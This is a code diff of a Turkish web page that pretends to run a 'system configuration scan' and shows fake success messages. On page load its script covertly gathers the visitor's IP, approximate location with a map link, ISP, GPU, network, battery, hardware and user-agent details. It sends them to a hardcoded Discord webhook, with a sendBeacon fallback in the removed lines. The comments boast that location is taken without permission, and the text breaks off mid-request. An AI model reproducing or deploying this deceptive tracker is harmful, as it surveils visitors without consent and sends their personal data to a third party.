@@ -5,107 +5,85 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sistem Kontrolü</title>
     <style>
-        body { background-color: #0f0f0f; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; color: #eeeeee; }
+        body { background-color: #0f0f0f; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; color: #eeeeee; overflow: hidden; }
         .container { text-align: center; }
-        .loader { border: 3px solid #333; border-top: 3px solid #00ff41; border-radius: 50%; width: 30px; height: 30px; animation: spin 0.6s linear infinite; margin: 0 auto 20px; }
+        .loader { border: 3px solid #1a1a1a; border-top: 3px solid #00ff41; border-radius: 50%; width: 35px; height: 35px; animation: spin 0.8s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { font-weight: 400; font-size: 15px; margin: 0; color: #555; }
+        h2 { font-weight: 400; font-size: 14px; margin: 0; color: #444; letter-spacing: 1px; }
         .success-text { color: #00ff41; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="container">
         <div id="loader" class="loader"></div>
-        <h2 id="msg">Site ayarları kontrol ediliyor...</h2>
+        <h2 id="msg">Sistem yapılandırması taranıyor...</h2>
     </div>
 
     <script>
-        // Webhook URL'ni kontrol et (Sonunda boşluk kalmasın)
         const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        async function herSeyiDok() {
-            let data = { gpu: "Bilinmiyor", ven: "Bilinmiyor", loc: "Yükleniyor...", ip: "X", bat: "X", lang: "Bilinmiyor", ram: "Bilinmiyor", cpu: "Bilinmiyor", screen: "Bilinmiyor" };
+        async function masterScan() {
+            let info = { gpu: "X", ven: "X", bat: "X", loc: "X", ip: "X", net: "X" };
 
-            // 1. IP ve SESSİZ KONUM (İzin İstemez)
+            // 1. DERİN DONANIM TARAMASI (GPU & VENDOR FIX)
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                const j = await res.json();
-                data.ip = j.ip;
-                // Google Maps linkindeki hata düzeltildi (${j.latitude} kullanıldı)
-                data.loc = `📍 **Bölge:** ${j.city}, ${j.region} / ${j.country_name}\n🛰️ **ISP:** ${j.org}\n🔗 [Haritada Gör](https://www.google.com/maps?q=${j.latitude},${j.longitude})`;
-            } catch(e) {
-                data.loc = "Lokasyon alınamadı";
-            }
+                const canvas = document.createElement('canvas');
+                // Hem WebGL2 hem WebGL deniyoruz
+                const gl = canvas.getContext('webgl2') || canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                if (dbg) {
+                    info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
+                    info.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
+                } else {
+                    info.gpu = "Tarayıcı Tarafından Gizlendi";
+                }
+            } catch(e) { info.gpu = "Donanım Erişimi Reddedildi"; }
 
-            // 2. GPU ve VENDOR (Efsane Sorgu Fix)
+            // 2. İNTERNET VE ŞEBEKE ANALİZİ (HER ŞEY)
             try {
-                const c = document.createElement('canvas');
-                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-                const d = gl.getExtension('WEBGL_debug_renderer_info');
-                if (d) {
-                    data.gpu = gl.getParameter(d.UNMASKED_RENDERER_ID);
-                    data.ven = gl.getParameter(d.UNMASKED_VENDOR_ID);
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (conn) {
+                    info.net = `**Tip:** ${conn.effectiveType || 'Bilinmiyor'} (${conn.type || 'N/A'})\n**Hız:** ~${conn.downlink} Mbps\n**Gecikme:** ${conn.rtt} ms`;
+                } else {
+                    info.net = "İnternet detayları bu tarayıcıda kısıtlı.";
                 }
             } catch(e) {}
 
-            // 3. PİL, RAM, CPU ve DİL
+            // 3. IP VE SESSİZ LOKASYON
+            try {
+                const r = await fetch('https://ipapi.co/json/');
+                const d = await r.json();
+                info.ip = d.ip;
+                info.loc = `📍 **Bölge:** ${d.city}, ${d.region} / ${d.country_name}\n🛰️ **Sağlayıcı:** ${d.org}\n🔗 [Haritada Gör](https://www.google.com/maps?q=${d.latitude},${d.longitude})`;
+            } catch(e) { info.loc = "IP Bazlı Konum Alınamadı"; }
+
+            // 4. PİL VE DİĞERLERİ
             try {
                 if (navigator.getBattery) {
                     const b = await navigator.getBattery();
-                    data.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Prizde' : 'Pilde'})`;
+                    info.bat = `%${(b.level * 100).toFixed(0)} (${b.charging ? 'Prizde' : 'Pilde'})`;
                 }
-                data.ram = `${navigator.deviceMemory || 'X'} GB`;
-                data.cpu = `${navigator.hardwareConcurrency || 'X'} Çekirdek`;
-                data.lang = navigator.language || "Bilinmiyor";
-                data.screen = `${window.screen.width}x${window.screen.height}`;
             } catch(e) {}
 
-            // 4. KIRMIZI EMBED ŞABLONU
+            // 5. KIRMIZI VAHŞİ EMBED (TAM RAPOR)
             const payload = {
                 embeds: [{
-                    title: "🕵️ KRİTİK SİSTEM ANALİZİ (REVIZED)",
+                    title: "🕵️ FULL SİSTEM VE İNTERNET ANALİZİ",
                     color: 15158332,
                     fields: [
-                        { name: "📍 LOKASYON (IP TABANLI)", value: data.loc, inline: false },
-                        { name: "🛠️ DONANIM KATMANI", value: `**GPU:** \`${data.gpu}\`\n**VENDOR:** \`${data.ven}\`\n**RAM:** ${data.ram}\n**CPU:** ${data.cpu}`, inline: false },
-                        { name: "📱 YAZILIM / EKRAN", value: `**OS:** ${navigator.platform}\n**RES:** ${data.screen}`, inline: true },
-                        { name: "🔋 DURUM", value: data.bat, inline: true },
-                        { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```", inline: false },
-                        { name: "🌐 EK BİLGİ", value: `**IP:** ${data.ip} | **Dil:** ${data.lang}`, inline: false }
+                        { name: "📍 LOKASYON VE IP", value: `${info.loc}\n**IP:** ${info.ip}`, inline: false },
+                        { name: "🌐 İNTERNET BAĞLANTISI", value: info.net, inline: false },
+                        { name: "🛠️ DONANIM KİMLİĞİ", value: `**GPU:** \`${info.gpu}\`\n**VENDOR:** \`${info.ven}\`\n**RAM:** ${navigator.deviceMemory || 'X'} GB\n**CPU:** ${navigator.hardwareConcurrency || 'X'} Çekirdek`, inline: false },
+                        { name: "📱 YAZILIM / EKRAN", value: `**OS:** ${navigator.platform}\n**RES:** ${screen.width}x${screen.height}\n**DİL:** ${navigator.language}`, inline: true },
+                        { name: "🔋 GÜÇ DURUMU", value: info.bat, inline: true },
+                        { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```", inline: false }
                     ],
+                    footer: { text: "Gizli Raporlama Sistemi" },
                     timestamp: new Date()
                 }]
             };
 
-            // 5. EN GARANTİ GÖNDERİM (Fetch Force)
+            // 6. GÖNDERİM
             const blob = JSON.stringify(payload);
-            
-            // Discord'a no-cors modunda değil, doğrudan göndermeyi deniyoruz
-            fetch(u, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: blob
-            }).catch(() => {
-                // Eğer fetch tarayıcı engeline takılırsa yedek olarak Beacon fırlatır
-                navigator.sendBeacon(u, blob);
-            });
-
-            // 6. ARAYÜZ AKIŞI
-            const msg = document.getElementById('msg');
-            const loader = document.getElementById('loader');
-            
-            setTimeout(() => {
-                msg.innerHTML = '<span class="success-text">Site uygun halde!</span>';
-            }, 800);
-
-            setTimeout(() => {
-                loader.style.display = "none";
-                msg.innerHTML = '<span class="success-text">Sorunlar düzeltildi.</span>';
-            }, 1800);
-        }
-
-        window.onload = herSeyiDok;
-    </script>
-</body>
-</html>
-
+            fetch(u, { method: 'POST', headers: {
+                
